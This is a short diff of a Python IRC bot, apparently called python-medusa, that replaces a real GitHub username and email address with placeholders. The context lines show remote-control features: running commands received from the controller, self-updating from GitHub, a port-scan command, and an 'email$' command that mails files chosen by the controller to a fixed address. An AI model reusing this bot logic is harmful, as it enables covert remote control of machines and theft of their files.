@@ -456,7 +456,7 @@ def run(cmd, public=False, return_to=admin):                                    
         log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
         log("\n")
 
-def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               # updates the bot by downloading new source from github
+def selfupdate(git_user="example",git_repo="python-medusa"):               # updates the bot by downloading new source from github
     log('[*] Starting Selfupdate...')
     privmsg('[+] Starting v%s selfupdate...' % version)
 
@@ -681,7 +681,7 @@ if __name__ == '__main__':
 
                         elif content[:6] == 'email$':
                             attch = content[6:].split(',')
-                            to = "nikisweeting+bot@gmail.com"
+                            to = "example@example.com"
                             broadcast(communication.email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))
 
                         elif content[:9] == 'portscan$':
@@ -779,7 +779,7 @@ if __name__ == '__main__':
                         elif content[:6] == 'email$':
 
                             attch = content[6:].split(',')
-                            to = "nikisweeting+bot@gmail.com"
+                            to = "example@example.com"
                             broadcast(communication.email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))
 
                         elif content[:1] == '$':
